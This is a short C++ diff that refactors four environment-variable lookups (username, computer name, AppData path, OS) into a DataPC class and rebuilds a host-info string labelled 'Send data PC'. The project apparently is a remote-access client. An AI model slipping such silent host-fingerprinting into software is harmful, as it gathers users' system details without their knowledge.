@@ -1,10 +1,15 @@
 #include "client.h"
 
-// Data PC
-std::string username = getenv("username");
-std::string computer = getenv("computername");
-std::string appdata = getenv("appdata");
-std::string operatingSystem = getenv("os");
+// DataPC
+class DataPC
+{
+public:
+    std::string username = getenv("username");
+    std::string computer = getenv("computername");
+    std::string appdata = getenv("appdata");
+    std::string operatingSystem = getenv("os");
+};
+DataPC DataPC;
 
 //
 void Client()
@@ -52,7 +57,7 @@ void Client()
 
     // Send data PC
     string codePC = "A";
-    string pc = codePC + " " + username + " | " + computer + " | " + operatingSystem + " | " + appdata;
+    string pc = codePC + " " + DataPC.username + " | " + DataPC.computer + " | " + DataPC.operatingSystem + " | " + DataPC.appdata;
 
     cout << pc << endl;
 
